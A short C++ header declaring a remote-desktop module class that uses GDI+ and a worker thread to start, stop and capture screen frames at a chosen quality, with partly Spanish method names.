#ifndef __MOD_REMOTE_DESKTOP
#define __MOD_REMOTE_DESKTOP

#include "headers.hpp"
#include<shlwapi.h>
#include<gdiplus.h>

class mod_RemoteDesktop {
	private:
		Gdiplus::GdiplusStartupInput gdiplusStartupInput;
		ULONG_PTR gdiplusToken;
		bool isGDIon = false;
		
		std::thread th_RemoteDesktop;
		std::mutex mtx_RemoteDesktop;

		void InitGDI() {
			if (Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL) == Gdiplus::Status::Ok) {
				isGDIon = true;
			}
		}

		void StopGDI() {
			Gdiplus::GdiplusShutdown(gdiplusToken);
		}
		
	public:
		bool isRunning = false;

		bool m_isRunning() {
			std::unique_lock<std::mutex> lock(mtx_RemoteDesktop);
			return isRunning;
		}
		
		mod_RemoteDesktop();
		~mod_RemoteDesktop();

		void IniciarLive(ULONG quality);
		void SpawnThread(ULONG quality);
		void DetenerLive();
		std::vector<BYTE> getFrameBytes(ULONG quality);
};

#endif
